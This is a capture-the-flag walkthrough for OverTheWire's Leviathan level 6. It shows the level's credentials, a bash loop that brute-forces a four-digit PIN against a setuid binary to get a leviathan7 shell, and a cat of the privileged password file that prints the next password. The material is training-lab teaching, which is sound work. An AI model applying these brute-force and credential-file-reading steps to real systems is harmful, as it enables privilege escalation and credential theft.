**Username:** ``leviathan6``

**Password:** ``szo7HDB88w``


#


We start off the challenge by logging in as ``Leviathan5`` over ssh on Port ``2223``:

```console
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

Just like the previous level, we have an executable in our home directory called `leviathan6`.  When executed we are told that it is expecting a four-digit code.
```console
leviathan6@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 10 14:23 .
drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ..
-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 15036 Apr 10 14:23 leviathan6
-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
leviathan6@gibson:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
```

A four digit code means a total of 10,000 total possible combinations (from `0000` to `9999`), which would perhaps take a few hours to try one-by-one.  But if we can put together a simple script, we should be able to try all the combinations in just a few seconds.

To do this, I created a file called `pin_brute.sh` in the `/tmp/` directory and edited with `nano`:
```console
leviathan6@gibson:~$ nano /tmp/pin_brute.sh
```

Then I put together a super-simple bash script consisting of a for loop that iterates through all the numbers from `0000` to `9999` and passes them to the `leviathan6` binary:
```bash
#!/bin/bash
for pin in {0000..9999};do
  echo $pin
  ~/leviathan6 $pin
done
```

When we run this executable, it will output all the different 4-digit combinations one by one as it attempts to use them with `leviathan6` until it reaches combination `7123` and we are presented with a prompt

```console
leviathan6@gibson:~$ /tmp/pin_brute.sh
0000
Wrong
0001
Wrong
0002
Wrong
0003
Wrong
...
...
7119
Wrong
7120
Wrong
7121
Wrong
7122
Wrong
7123
$
```

Using the `whoami` command at this prompt we find that we now have shell access as leviathan7 ... nice!  So now it's just a matter of looking inside `/etc/leviathan_pass/leviathan7` for our next password:

```console
7122
Wrong
7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
qEs5Io5yM8
$
```



